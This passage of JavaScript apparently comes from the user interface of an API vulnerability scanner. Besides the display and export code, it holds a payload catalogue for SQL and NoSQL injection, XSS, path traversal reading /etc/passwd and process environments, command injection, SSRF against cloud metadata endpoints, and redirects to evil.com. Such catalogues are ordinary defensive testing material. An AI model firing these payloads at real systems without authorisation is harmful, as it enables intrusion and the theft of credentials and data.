  const paramLbl = probe.param   ? ` <span class="as-probe-param-lbl" title="Tested parameter">${_asEsc(probe.param)}</span>` : "";
  const probeType = _asGetProbeType(probe);

  // ── Injection location badge ──────────────────────────────────────────────
  const locLabel = { header:"HEADER", query:"QUERY PARAM", body:"REQUEST BODY",
                     path:"URL PATH", passive:"passive", other:"?" };
  const locColor = { header:"#58a6ff", query:"#3fb950", body:"#e3b341",
                     path:"#ff7b72", passive:"var(--text3)", other:"var(--text3)" };
  const injBadge = pload
    ? `<span style="font-size:9px;font-weight:700;font-family:var(--mono);padding:1px 6px;border-radius:3px;background:${locColor[probeType]}22;border:1px solid ${locColor[probeType]}55;color:${locColor[probeType]};margin-left:8px">Injected in: ${locLabel[probeType]||probeType.toUpperCase()}</span>`
    : "";

  // ── URL display — show decoded URL with payload highlighted ───────────────
  const rawUrl     = probe.url || "";
  const decodedUrl = _asTryDecode(rawUrl);
  // Highlight in decoded URL (easier to read), fallback to raw
  const urlHtml    = _asHighlightPayload(decodedUrl, pload) || _asEsc(rawUrl);

  // ── Body display — highlight payload + JSON pretty-print ─────────────────
  let bodyHtml = "";
  if (probe.req_body) {
    const bodyDecoded = _asTryDecode(probe.req_body);
    const prettyBody  = _asFmtJson(bodyDecoded) || bodyDecoded;
    bodyHtml = _asHighlightPayload(prettyBody, pload);
    // If payload not found directly, also try JSON-escaped version
    if (pload && !prettyBody.includes(pload)) {
      try {
        const escaped = JSON.stringify(pload).slice(1, -1);
        if (prettyBody.includes(escaped)) bodyHtml = _asHighlightPayload(prettyBody, escaped);
      } catch {}
    }
  }

  // ── Status pill for RESPONSE header ──────────────────────────────────────
  const st = probe.status || 0;
  const stPillCls = st >= 500 ? "status-5xx" : st >= 400 ? "status-4xx"
                  : st >= 300 ? "status-3xx" : st >= 200 ? "status-2xx" : "status-err";

  // ── Elapsed time badge (highlight slow probes — key signal for timing attacks) ─
  const _ms = probe.elapsed_ms || 0;
  const elapsedBadge = _ms > 500
    ? `<span style="font-size:9px;font-family:var(--mono);flex-shrink:0;
                    color:${_ms > 5000 ? '#f85149' : _ms > 2000 ? '#e3b341' : 'var(--text3)'}"
             title="Response time for this probe">
         ${_ms >= 1000 ? (_ms / 1000).toFixed(1) + 's' : Math.round(_ms) + 'ms'}
       </span>`
    : "";

  reqPanel.innerHTML = `
    <div class="as-detail-section-title">
      <div style="display:flex;align-items:center;justify-content:space-between;gap:8px;min-width:0">
        <div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;min-width:0;overflow:hidden">
          <span>REQUEST</span>
          ${paramLbl}
          ${injBadge}
        </div>
        <button class="as-copy-curl-btn" onclick="asCopyCurlFromProbe(${probe.id})"
                title="Copy this probe as a cURL command">&#x2398; Copy cURL</button>
      </div>
    </div>
    <div class="as-detail-section-body">
      <div class="as-detail-line as-detail-method">${_asEsc(probe.method||"")} ${urlHtml}</div>
      ${reqHdrs ? `<div class="as-detail-headers">${_asHighlightPayload(reqHdrs, pload)}</div>` : ""}
      ${bodyHtml ? `<div class="as-detail-body">${bodyHtml}</div>` : ""}
    </div>`;

  respPanel.innerHTML = `
    <div class="as-detail-section-title">
      <div style="display:flex;align-items:center;justify-content:space-between;gap:8px">
        <span>RESPONSE</span>
        <div style="display:flex;align-items:center;gap:6px">
          ${elapsedBadge}
          <span class="status-pill ${stPillCls}">${st || "?"}</span>
        </div>
      </div>
    </div>
    <div class="as-detail-section-body">
      ${respHdrs ? `<div class="as-detail-headers">${_asEsc(respHdrs)}</div>` : ""}
      ${probe.resp_body ? `<div class="as-detail-body">${_asEsc(probe.resp_body)}</div>` : ""}
    </div>`;
}

function _asVisibleProbeIds() {
  return [...document.querySelectorAll("#as-probe-list .as-probe-row")]
    .filter(r => r.style.display !== "none")
    .map(r => Number(r.dataset.probeId))
    .filter(id => !Number.isNaN(id));
}

function asMoveProbe(delta) {
  const ids = _asVisibleProbeIds();
  if (!ids.length) return;
  let idx = ids.indexOf(_asSelProbeId);
  if (idx < 0) idx = delta > 0 ? -1 : ids.length;
  const nextIdx = Math.max(0, Math.min(ids.length - 1, idx + delta));
  const next = ids[nextIdx];
  if (next === _asSelProbeId) return;
  asSelectProbe(next);
}

function _asProbeNavKeydown(e) {
  if (e.key !== "ArrowUp" && e.key !== "ArrowDown") return;
  if (_asCurrentTab !== "scanning") return;
  const tool = document.getElementById("tool-apiscan");
  if (tool && tool.style.display === "none") return;
  const panel = document.getElementById("as-panel-scanning");
  if (!panel || panel.style.display === "none") return;
  const t = e.target;
  const tag = (t && t.tagName) ? t.tagName.toLowerCase() : "";
  if (tag === "input" || tag === "textarea" || tag === "select" || (t && t.isContentEditable)) return;
  const body = document.getElementById("as-scan-body");
  const inProbes = !!(body && t && t.closest && t.closest("#as-scan-body"));
  if (!inProbes && t !== document.body && _asSelProbeId == null) return;
  e.preventDefault();
  asMoveProbe(e.key === "ArrowDown" ? 1 : -1);
}

function _asShowProbePlaceholder() {
  const rq = document.getElementById("as-req-panel");
  const rs = document.getElementById("as-resp-panel");
  const ph = `<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;gap:8px;color:var(--text3);padding:20px">
    <div style="font-size:28px;opacity:.4">🔬</div>
    <div style="font-size:11px">Click a probe to view request / response</div>
  </div>`;
  if (rq)  rq.innerHTML  = ph;
  if (rs)  rs.innerHTML  = "";
}

// ── Progress ──────────────────────────────────────────────────────────────────
function _asRenderProgress(prog, issueCount) {
  if (!prog) return;
  const fillEl  = document.getElementById("as-progress-fill");
  const labelEl = document.getElementById("as-progress-label");
  const issEl   = document.getElementById("as-issue-live");
  const pctEl   = document.getElementById("as-progress-pct");
  const pct     = prog.pct || 0;
  const api     = prog.api || "";
  const cur     = prog.current || 0;
  const tot     = prog.total || 0;
  if (fillEl)  fillEl.style.width = `${pct}%`;
  if (pctEl)   pctEl.textContent  = `${pct}%`;
  // Show a phase label: while pct=0 and no probes yet → Initializing/Baseline
  const probeCount = _asProbes.length - _asProbeIdOffset;   // probes from current job
  let label;
  if (tot > 0) {
    const phase = (pct === 0 && probeCount <= 0)
      ? " (baseline…)"
      : (pct > 0 ? ` — ${pct}%` : "");
    label = `Scanning ${cur}/${tot}${api ? ": " + api : ""}${phase}`;
  } else {
    label = api || "Starting…";
  }
  if (labelEl) {
    labelEl.textContent = label;
    labelEl.title       = label;   // full text on hover — label is ellipsis-truncated when the URL is long
  }
  if (issEl)   issEl.textContent  = issueCount > 0 ? `🚨 ${issueCount} issue${issueCount!==1?"s":""} found` : "";
}

// confirmed: true = re-probe verified · false = likely FP · null/undefined = not re-probed
function _asConfirmMeta(iss) {
  if (iss && iss.confirmed === true) {
    return {
      key: "confirmed",
      label: "Confirmed",
      tip: "Re-probe reproduced the finding — treat as a real issue.",
    };
  }
  if (iss && iss.confirmed === false) {
    return {
      key: "fp",
      label: "Likely FP",
      tip: "Re-probe found no injection evidence, or a known FP rule matched (e.g. pagination IDOR).",
    };
  }
  return {
    key: "unverified",
    label: "Unverified",
    tip: "No re-probe for MEDIUM/LOW/INFO — review manually. Only CRITICAL/HIGH are auto-confirmed.",
  };
}

// ── Results ───────────────────────────────────────────────────────────────────
function _asRenderResults() {
  if (!_asResults) return;
  const entriesDone = _asResults.entries_done || [];
  const allIssues   = [];
  entriesDone.forEach(ed => {
    const entry = ed.entry || {};
    let m = entry.method || "";
    let u = entry.url    || "";
    // Partial live entries store method="" url="POST https://..." — normalise
    if (!m && u) {
      const mx = u.match(/^(GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS)\s+(https?:\/\/.+)$/i);
      if (mx) { m = mx[1].toUpperCase(); u = mx[2]; }
    }
    (ed.issues||[]).forEach(iss => allIssues.push({...iss, _method:m, _url:u, _entry:{...entry, method:m, url:u}}));
  });
  const total  = allIssues.length;
  const fpCount = allIssues.filter(i => i.confirmed === false).length;
  const confCount = allIssues.filter(i => i.confirmed === true).length;
  const SEV    = ["CRITICAL","HIGH","MEDIUM","LOW","INFO"];
  const counts = Object.fromEntries(SEV.map(s=>[s,0]));
  const SEV_COL= {CRITICAL:"#ff4444",HIGH:"#ff8800",MEDIUM:"#ffcc00",LOW:"#44aaff",INFO:"#8b949e"};
  const SEV_BG = {CRITICAL:"rgba(248,81,73,.2)",HIGH:"rgba(255,136,0,.15)",MEDIUM:"rgba(255,204,0,.12)",LOW:"rgba(68,170,255,.12)",INFO:"rgba(139,148,158,.1)"};
  allIssues.forEach(i => { const s=(i.severity||"INFO").toUpperCase(); counts[s]=(counts[s]||0)+1; });

  const hdr = document.getElementById("as-results-title");
  if (hdr) {
    const parts = [`${total} issue${total!==1?"s":""}`, `${entriesDone.length} API${entriesDone.length!==1?"s":""}`];
    if (confCount) parts.push(`${confCount} confirmed`);
    if (fpCount)   parts.push(`${fpCount} likely FP`);
    hdr.textContent = `Results — ${parts.join(" · ")}`;
  }

  // FP toggle — only toggles confirmed===false (Likely FP), not Unverified
  const fpToggle = document.getElementById("as-fp-toggle");
  if (fpToggle) {
    fpToggle.style.display = fpCount > 0 ? "" : "none";
    fpToggle.classList.toggle("active", _asHideFP);
    fpToggle.textContent = _asHideFP
      ? `⚠ Show ${fpCount} Likely FP`
      : `⚠ Hide ${fpCount} Likely FP`;
  }

  const cards = document.getElementById("as-summary-cards");
  if (cards) {
    cards.innerHTML = SEV.map(s => {
      const c=SEV_COL[s], bg=SEV_BG[s];
      return `<div class="as-sev-card" style="border:1px solid ${c}40;background:${bg}">
        <div style="font-size:20px;font-weight:700;color:${c}">${counts[s]||0}</div>
        <div style="font-size:10px;color:${c};font-weight:600;margin-top:2px">${s}</div>
      </div>`;
    }).join("");
  }

  document.querySelectorAll(".as-filter-btn").forEach(b =>
    b.classList.toggle("active", b.dataset.sev === _asSevFilter));

  const tbody = document.getElementById("as-results-tbody");
  if (!tbody) return;
  let filtered = _asSevFilter === "ALL"
    ? allIssues
    : allIssues.filter(i => (i.severity||"INFO").toUpperCase() === _asSevFilter);

  // Hide Likely FP (confirmed===false) when toggle is on; Unverified stays visible
  if (_asHideFP) filtered = filtered.filter(i => i.confirmed !== false);

  if (!filtered.length) {
    const msg = _asHideFP && fpCount > 0
      ? `Visible list is empty — ${fpCount} Likely FP issue${fpCount!==1?"s are":" is"} hidden. <span style="cursor:pointer;color:var(--blue2)" onclick="asToggleFP()">Show Likely FP</span>`
      : `No issues${_asSevFilter!=="ALL"?" for "+_asSevFilter:""}`;
    tbody.innerHTML = `<tr><td colspan="9" style="text-align:center;padding:30px;color:var(--text3)">${msg}</td></tr>`;
    return;
  }

  tbody.innerHTML = filtered.map((iss, idx) => {
    const sev  = (iss.severity||"INFO").toUpperCase();
    const meta = _asConfirmMeta(iss);
    const isFP = meta.key === "fp";
    const rawPl = (iss.payload||"").trim();
    const isNA  = rawPl === "" || rawPl.toUpperCase() === "N/A";
    const plCell = isNA
      ? `<span class="as-payload-passive" title="No injection — passive check">passive check</span>`
      : `<span style="font-family:var(--mono);font-size:11px" title="${_asEsc(rawPl)}">${_asEsc(rawPl.slice(0,80))}</span>`;

    const isSel  = idx === _asSelResultIdx;
    return `<tr class="as-result-row${isSel ? " as-result-selected" : ""}${isFP ? " as-row-fp" : ""}" onclick="_asSelectResult(${idx})">
      <td style="color:var(--text3);font-family:var(--mono)">${idx+1}</td>
      <td style="white-space:nowrap"><span class="as-sev as-sev-${sev}">${sev}</span></td>
      <td style="white-space:nowrap"><span class="as-confirm-badge as-confirm-${meta.key}" title="${_asEsc(meta.tip)}">${meta.label}</span></td>
      <td>${_asEsc(iss.vulnerability||"")}</td>
      <td style="font-family:var(--mono);font-size:11px">${_asEsc(iss.parameter||"")}</td>
      <td>${plCell}</td>
      <td style="font-size:11px">${_asEsc((iss.evidence||"").slice(0,100))}</td>
      <td><span class="method-badge method-${(iss._method||"").toUpperCase()}">${_asEsc(iss._method||"")}</span></td>
      <td style="font-family:var(--mono);font-size:10px;color:var(--text3)" title="${_asEsc(iss._url||"")}">
        ${_asEsc((iss._url||"").slice(0,60))}
      </td>
    </tr>`;
  }).join("");
}

function asToggleExpand(idx) {
  _asExpanded[idx] = !_asExpanded[idx];
  const r = document.getElementById(`as-expand-${idx}`);
  if (r) r.style.display = _asExpanded[idx] ? "" : "none";
}
function asFilterResults(sev) {
  _asSevFilter = sev;
  document.querySelectorAll(".as-filter-btn").forEach(b => b.classList.toggle("active", b.dataset.sev === sev));
  _asRenderResults();
}

function asToggleFP() {
  _asHideFP = !_asHideFP;
  _asRenderResults();
}

/** Handoff Possible-IDOR finding → IDOR Tester (dual-token BOLA). */
function asSendToIdorTester(idx) {
  if (typeof idx !== "number") idx = _asSelResultIdx;
  const entriesDone = (_asResults && _asResults.entries_done) || [];
  const allIssues = [];
  entriesDone.forEach(ed => {
    const entry = ed.entry || {};
    (ed.issues || []).forEach(iss =>
      allIssues.push({ ...iss, _entry: entry, _method: entry.method || "", _url: entry.url || "" }));
  });
  let filtered = _asSevFilter === "ALL"
    ? allIssues
    : allIssues.filter(i => (i.severity || "INFO").toUpperCase() === _asSevFilter);
  if (_asHideFP) filtered = filtered.filter(i => i.confirmed !== false);
  const iss = filtered[idx];
  if (!iss) { _asShowToast("No issue selected"); return; }

  const entry = iss._entry || {};
  let method = (entry.method || iss._method || "GET").toUpperCase();
  let url = entry.url || iss._url || iss.url || "";
  if (!method && url) {
    const mx = url.match(/^(GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS)\s+(https?:\/\/.+)$/i);
    if (mx) { method = mx[1].toUpperCase(); url = mx[2]; }
  }
  if (!url || !String(url).startsWith("http")) {
    _asShowToast("No URL on this issue to send to IDOR Tester");
    return;
  }
  const headers = Object.assign({}, entry.headers || {});
  let body = entry.body;
  if (body && typeof body !== "string") {
    try { body = JSON.stringify(body); } catch { body = String(body); }
  }

  if (typeof window.switchTool !== "function" || typeof window.idorImportEntries !== "function") {
    alert("IDOR Tester is not available in this build.");
    return;
  }
  window.switchTool("idor");
  window.idorImportEntries(
    [{ method, url, headers, body: body || null }],
    "API Scan (Possible IDOR)"
  );
  _asShowToast("Sent to IDOR Tester — set Token 2 (attacker) to confirm BOLA");
}
window.asSendToIdorTester = asSendToIdorTester;

// ── Stop scan ─────────────────────────────────────────────────────────────────
async function asStopScan() {
  if (!_asJobId) return;
  const btn = document.getElementById("as-stop-btn");
  if (btn) { btn.disabled = true; btn.textContent = "Aborting…"; }
  try {
    await fetch(`${AS_BASE}/apiscan/stop/${_asJobId}`, { method: "POST" });
  } catch (e) { /* network — UI still moves to stopped */ }

  if (_asPollTimer) { clearInterval(_asPollTimer); _asPollTimer = null; }

  // Snapshot whatever completed entries are currently visible into the accumulator
  _asAllEntriesDone = (_asResults?.entries_done || []).filter(e => !e.partial);
  _asAllEntriesDone.forEach(ed => {
    const k = _asUrlKey(ed.entry?.url || "");
    if (k) _asScannedUrls.add(k);
  });
  _asScanningUrls = new Set();
  _asRenderList();
  _asShowToast("Scan aborted — click ▶ Resume for remaining APIs");
  _asUpdateStopBtn("stopped");
  _asUpdateScanBtn();
}

async function asResumeScan() {
  if (!_asScanEntriesSaved.length) return;

  // Which entries fully completed (present in entries_done with issue_count set)?
  const doneUrls = new Set(
    (_asResults?.entries_done || [])
      .filter(e => !e.partial)          // ignore the live "partial" entry
      .map(e => e.entry?.url || "")
  );
  const remaining = _asScanEntriesSaved.filter(e => !doneUrls.has(e.url));

  if (!remaining.length) {
    _asShowToast("All selected APIs were already scanned");
    _asUpdateStopBtn("done");
    return;
  }

  _asShowToast(`▶ Resuming — ${remaining.length} API${remaining.length > 1 ? "s" : ""} remaining`);
  // Pass isResume=true to preserve the probe list from the stopped run
  await _asDoStartScan(remaining, _asScanCustomsSaved, true);
}

// ── Export ────────────────────────────────────────────────────────────────────
async function asExportCsv() {
  if (!_asJobId) return;
  try {
    const r = await fetch(`${AS_BASE}/apiscan/export/csv/${_asJobId}`, {method:"POST"});
    if (!r.ok) { _asShowToast("Export failed"); return; }
    const d = await r.json();
    if (window.pywebview?.api?.save_file) {
      const res = await window.pywebview.api.save_file(d.csv, "api_scan_report.csv");
      if (res?.ok) _asShowToast(`✅ Saved: ${res.filename}`);
    } else {
      const a = document.createElement("a");
      a.href = "data:text/csv;charset=utf-8,"+encodeURIComponent(d.csv);
      a.download = "api_scan_report.csv"; a.click();
      _asShowToast("CSV downloaded");
    }
  } catch(e) { _asShowToast("Export error: "+e.message); }
}
async function asExportHtml() {
  if (!_asJobId) return;
  try {
    const r = await fetch(`${AS_BASE}/apiscan/export/html/${_asJobId}`, {method:"POST"});
    if (!r.ok) { _asShowToast("Export failed"); return; }
    const d = await r.json();
    if (window.pywebview?.api?.save_file) {
      const res = await window.pywebview.api.save_file(d.html, "api_scan_report.html");
      if (res?.ok) _asShowToast(`✅ Saved: ${res.filename}`);
    } else {
      const a = document.createElement("a");
      a.href = "data:text/html;charset=utf-8,"+encodeURIComponent(d.html);
      a.download = "api_scan_report.html"; a.click();
      _asShowToast("HTML report downloaded");
    }
  } catch(e) { _asShowToast("Export error: "+e.message); }
}

// ── Scan options (delay / modules / OOB) — CLI parity ─────────────────────────
function _asScanOptionsPayload() {
  const oobOn = !!document.getElementById("as-oob-enabled")?.checked;
  const oobServer = (document.getElementById("as-oob-server")?.value || "").trim();
  const oobToken  = (document.getElementById("as-oob-token")?.value || "").trim();
  const selected = _asModuleKeys.filter((k) => _asModuleSel[k]);
  // Only send explicit modules when user customized selection vs profile defaults
  let modules = [];
  let skip_modules = [];
  if (_asModulesCustom) {
    if (selected.length) {
      modules = selected;
    } else {
      // All unchecked → skip every known module (passive-like)
      skip_modules = _asModuleKeys.slice();
    }
  }
  return {
    profile:      _asProfile,
    threads:      _asThreads,
    timeout:      _asTimeout,
    delay_sec:    _asDelaySec,
    modules,
    skip_modules,
    oob_enabled:  oobOn,
    oob_server:   oobOn ? (oobServer || null) : null,
    oob_token:    oobOn ? (oobToken || null) : null,
  };
}

function asToggleModulesPanel() {
  const panel = document.getElementById("as-modules-panel");
  if (!panel) return;
  const open = panel.style.display === "none" || !panel.style.display;
  panel.style.display = open ? "block" : "none";
  if (open && !_asModuleKeys.length) _asLoadModulesCatalog();
}
window.asToggleModulesPanel = asToggleModulesPanel;

function asSyncOobHint() {
  const hint = document.getElementById("as-oob-hint");
  const on = !!document.getElementById("as-oob-enabled")?.checked;
  const server = (document.getElementById("as-oob-server")?.value || "").trim();
  if (!hint) return;
  if (!on) {
    hint.style.display = "none";
    hint.textContent = "";
    return;
  }
  hint.style.display = "block";
  if (!server) {
    hint.textContent =
      "OOB ON · public oast.pro fallback — injects blind CMDi/SSRF/SQLi/XXE canaries, " +
      "then waits ~8s for DNS/HTTP callbacks (Abort stops the wait). " +
      "Only on authorized targets. Prefer a private interactsh host.";
  } else {
    hint.textContent =
      "OOB ON · private server — blind CMDi/SSRF/SQLi/XXE canaries + ~8s callback poll " +
      "(mid + end). Requires interactsh-client on the scanner host.";
  }
}
window.asSyncOobHint = asSyncOobHint;

/** true = proceed; false = user cancelled public OOB fallback */
function _asConfirmPublicOob() {
  const oobOn = !!document.getElementById("as-oob-enabled")?.checked;
  if (!oobOn) return true;
  const server = (document.getElementById("as-oob-server")?.value || "").trim();
  if (server) return true;
  return window.confirm(
    "OOB is ON but no private interactsh server is set.\n\n" +
    "Scan will use the public oast.pro collaborator for blind callbacks " +
    "(DNS/HTTP canaries leave your network).\n\n" +
    "Continue only on targets you own / are authorized to test.\n\n" +
    "OK = use public oast.pro · Cancel = stop and set a private server (or turn OOB off)."
  );
}

function _asApplyProfileModules(profile) {
  const all = _asModuleKeys;
  const preset = _asProfilesMap[profile];
  const allowed = Array.isArray(preset) ? new Set(preset) : new Set(all);
  // passive → empty list
  if (profile === "passive" || (Array.isArray(preset) && preset.length === 0)) {
    all.forEach((k) => { _asModuleSel[k] = false; });
  } else {
    all.forEach((k) => { _asModuleSel[k] = allowed.has(k); });
  }
  _asModulesCustom = false;
  _asRenderModulesGrid();
}

function _asRenderModulesGrid() {
  const grid = document.getElementById("as-modules-grid");
  const countEl = document.getElementById("as-modules-count");
  if (!grid) return;
  if (!_asModuleKeys.length) {
    grid.innerHTML = `<span style="font-size:11px;color:var(--text3)">Loading modules…</span>`;
    return;
  }
  const n = _asModuleKeys.filter((k) => _asModuleSel[k]).length;
  if (countEl) {
    countEl.textContent = `${n} / ${_asModuleKeys.length} modules`
      + (_asModulesCustom ? " (custom)" : ` (${_asProfile})`);
  }
  grid.innerHTML = _asModuleKeys.map((k) => {
    const on = !!_asModuleSel[k];
    const label = _asModuleLabel(k);
    return `<div class="as-mod-chip${on ? "" : " is-off"}" title="${_asEsc(label)} [${_asEsc(k)}]">
      <label class="as-mod-chip-main">
        <input type="checkbox" data-mod="${_asEsc(k)}" ${on ? "checked" : ""}
               onchange="asToggleModule('${k}', this.checked)">
        <span class="as-mod-label">${_asEsc(label)}</span>
      </label>
      <button type="button" class="as-mod-eye-btn" title="View ${_asEsc(label)} Payloads"
              onclick="asOpenPayloadModal('${k}', event)">
        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
          <circle cx="12" cy="12" r="3"></circle>
        </svg>
      </button>
    </div>`;
  }).join("");
}

function asToggleModule(key, on) {
  _asModuleSel[key] = !!on;
  _asModulesCustom = true;
  _asRenderModulesGrid();
}
window.asToggleModule = asToggleModule;

// ── Payloads Modal Catalog & Controller ───────────────────────────────────────
const _AS_MODULE_PAYLOADS_CATALOG = {
  sqli: {
    desc: "Detects SQL Injection using multi-DBMS error extraction, boolean-blind differential baselines, time-based delayed verification, and UNION polyglot probes.",
    type: "Insertion Point (Query, Body, Header)",
    vectors: [
      { tag: "AUTH BYPASS", val: "' OR '1'='1" },
      { tag: "AUTH BYPASS", val: "' OR 1=1-- -" },
      { tag: "AUTH BYPASS", val: "admin'--" },
      { tag: "AUTH BYPASS", val: "\" OR \"\"=\"" },
      { tag: "AUTH BYPASS", val: "') OR ('1'='1" },
      { tag: "ERROR-BASED", val: "' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version))--" },
      { tag: "ERROR-BASED", val: "' AND 1=CONVERT(int, @@version)--" },
      { tag: "ORDER BY", val: "1' ORDER BY 1-- -" },
      { tag: "ORDER BY", val: "1' ORDER BY 10-- -" },
      { tag: "UNION SELECT", val: "' UNION SELECT NULL, @@version-- -" },
      { tag: "UNION SELECT", val: "1' UNION SELECT NULL, version()-- -" },
      { tag: "TIME-BASED", val: "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -" },
      { tag: "TIME-BASED", val: "1'; WAITFOR DELAY '0:0:5'--" },
      { tag: "TIME-BASED", val: "1' AND pg_sleep(5)--" },
      { tag: "TIME-BASED", val: "1' AND 1=randomblob(1000000000)--" },
      { tag: "POLYGLOT", val: "SLEEP(5) /*' or SLEEP(5) or '\" or SLEEP(5) or \"*/" },
    ]
  },
  nosqli: {
    desc: "Evaluates MongoDB / CouchDB / DynamoDB operator injection in JSON bodies and query bracket notation, checking for auth bypass and expression evaluation.",
    type: "Insertion Point (JSON Body & Query)",
    vectors: [
      { tag: "OPERATOR $NE", val: "{\"$ne\": null}" },
      { tag: "OPERATOR $NE", val: "{\"$ne\": 1}" },
      { tag: "OPERATOR $GT", val: "{\"$gt\": \"\"}" },
      { tag: "OPERATOR $GTE", val: "{\"$gte\": 0}" },
      { tag: "REGEX", val: "{\"$regex\": \".*\"}" },
      { tag: "EXPRESSION", val: "{\"$expr\": {\"$eq\": [1, 1]}}" },
      { tag: "JS WHERE", val: "{\"$where\": \"sleep(5000)\"}" },
      { tag: "JS WHERE", val: "{\"$where\": \"this.password.match(/.*/)\"}" },
      { tag: "QUERY BRACKET", val: "[$ne]=1" },
      { tag: "QUERY BRACKET", val: "[$gt]=" },
      { tag: "QUERY BRACKET", val: "[$regex]=.*" },
      { tag: "QUERY BRACKET", val: "[$where]=1" },
    ]
  },
  xss: {
    desc: "Tests for Reflected Cross-Site Scripting across HTML body, attribute breakout, JavaScript string execution, and SVG XML contexts with entity decoding validation.",
    type: "Insertion Point (Query, Body, Header)",
    vectors: [
      { tag: "SCRIPT TAG", val: "<script>alert(1)</script>" },
      { tag: "TAG BREAKOUT", val: "\"><script>alert('XSS')</script>" },
      { tag: "IMG ONERROR", val: "\"><img src=x onerror=alert(1)>" },
      { tag: "SVG XML", val: "<svg/onload=alert(1)>" },
      { tag: "JS CONTEXT", val: "'-alert(1)-'" },
      { tag: "AUTOFOCUS", val: "\" onfocus=\"alert(1)\" autofocus=\"" },
      { tag: "EVENT HANDLER", val: "<details open ontoggle=alert(1)>" },
      { tag: "URI SCHEME", val: "javascript:alert(1)" },
      { tag: "IFRAME", val: "<iframe src=\"javascript:alert(1)\">" },
      { tag: "FILTER BYPASS", val: "<script/src=\"data:,alert(1)\">" },
      { tag: "EVENT ONLOAD", val: "<body onload=alert(1)>" },
    ]
  },
  lfi: {
    desc: "Probes for Local File Inclusion and Path Traversal across Linux /proc and /etc, Windows system configuration files, double-encoded traversals, and wrappers.",
    type: "Insertion Point (Path, Query, Body)",
    vectors: [
      { tag: "LINUX SYSTEM", val: "../../../../../../../../etc/passwd" },
      { tag: "URL ENCODED", val: "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd" },
      { tag: "DOUBLE ENCODED", val: "..%252f..%252f..%252f..%252fetc%252fpasswd" },
      { tag: "NESTED BYPASS", val: "....//....//....//....//etc/passwd" },
      { tag: "NULL BYTE", val: "/etc/passwd%00.png" },
      { tag: "PROCESS CMD", val: "/proc/self/cmdline" },
      { tag: "PROCESS ENV", val: "/proc/self/environ" },
      { tag: "HOSTS FILE", val: "/etc/hosts" },
      { tag: "WINDOWS INI", val: "c:\\windows\\win.ini" },
      { tag: "WINDOWS BACKSLASH", val: "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini" },
      { tag: "WINDOWS SYS", val: "c:\\windows\\system.ini" },
      { tag: "PHP WRAPPER", val: "php://filter/convert.base64-encode/resource=index.php" },
    ]
  },
  cmdi: {
    desc: "Tests for Remote OS Command Injection using dynamic math evaluation (expr 93821 + 10283 = 104104), Windows cmd math, time-based delays, and shell chaining.",
    type: "Insertion Point (Query, Body, Header)",
    vectors: [
      { tag: "MATH EVAL", val: "; expr 93821 + 10283 ;" },
      { tag: "PIPE CHAIN", val: "| expr 93821 + 10283 |" },
      { tag: "AMPERSAND", val: "& expr 93821 + 10283 &" },
      { tag: "BACKTICK", val: "`expr 93821 + 10283`" },
      { tag: "SUB-SHELL", val: "$(expr 93821 + 10283)" },
      { tag: "WINDOWS CMD", val: "& set /a 93821+10283 &" },
      { tag: "TIME DELAY", val: "; sleep 5 ;" },
      { tag: "PIPE DELAY", val: "| sleep 5 |" },
      { tag: "PING DELAY", val: "; ping -c 5 127.0.0.1 ;" },
      { tag: "WINDOWS PING", val: "& ping -n 5 127.0.0.1 &" },
      { tag: "WHITESPACE BYPASS", val: ";cat$IFS/etc/passwd;" },
      { tag: "QUOTE BREAKOUT", val: "'; expr 93821 + 10283 ;'" },
    ]
  },
  ssrf: {
    desc: "Audits for Server-Side Request Forgery against AWS IMDSv1/v2, GCP, Azure, Oracle Cloud, Kubernetes APIs, and obfuscated internal IP representations.",
    type: "Insertion Point (URL, Path, Body)",
    vectors: [
      { tag: "AWS IMDSv1", val: "http://169.254.169.254/latest/meta-data/" },
      { tag: "AWS IMDSv2", val: "http://169.254.169.254/latest/api/token" },
      { tag: "GCP METADATA", val: "http://metadata.google.internal/computeMetadata/v1/" },
      { tag: "AZURE IMDS", val: "http://169.254.169.254/metadata/instance?api-version=2021-02-01" },
      { tag: "ORACLE CLOUD", val: "http://192.0.0.192/latest/meta-data/" },
      { tag: "ALIBABA CLOUD", val: "http://100.100.100.200/latest/meta-data/" },
      { tag: "KUBERNETES API", val: "https://kubernetes.default.svc/api" },
      { tag: "LOOPBACK IP", val: "http://127.0.0.1:80/" },
      { tag: "LOCAL HOSTNAME", val: "http://localhost:8080/" },
      { tag: "HEX ENCODED IP", val: "http://0x7f000001/" },
      { tag: "DWORD IP", val: "http://2130706433/" },
      { tag: "OCTAL IP", val: "http://0177.0.0.01/" },
      { tag: "IPV6 LOOPBACK", val: "http://[::1]/" },
      { tag: "IPV4 MAPPED IPV6", val: "http://[::ffff:127.0.0.1]/" },
      { tag: "DNS WILDCARD", val: "http://spoofed.localtest.me/" },
      { tag: "COLLABORATOR OOB", val: "http://canary.<oob_server>/" },
    ]
  },
  redirect: {
    desc: "Checks for Open URL Redirection via HTTP Location headers, HTML Meta refresh tags, and client-side DOM redirection script execution.",
    type: "Insertion Point (URL & Query)",
    vectors: [
      { tag: "HTTPS EVIL", val: "https://evil.com" },
      { tag: "PROTOCOL RELATIVE", val: "//evil.com" },
      { tag: "BACKSLASH RELATIVE", val: "/\\evil.com" },
      { tag: "SUBDOMAIN SPOOF", val: "https://target.com.evil.com" },
      { tag: "AUTH AT-SIGN", val: "https://target.com@evil.com" },
      { tag: "JS SCHEME", val: "javascript:alert(document.domain)" },
      { tag: "URL ENCODED SLASH", val: "%2f%2fevil.com" },
      { tag: "HASH FRAGMENT", val: "https://evil.com%23target.com" },
      { tag: "TAB ENCODING", val: "/%09/evil.com" },
      { tag: "QUESTION SPOOF", val: "https://evil.com?target.com" },
    ]
  },
  crlf: {
    desc: "Injects Carriage Return / Line Feed characters (%0d%0a) into headers and query parameters to test for HTTP response splitting and arbitrary cookie setting.",
    type: "Insertion Point (Header & Query)",
    vectors: [
      { tag: "SET-COOKIE", val: "%0d%0aSet-Cookie:apiscan_crlf=1" },
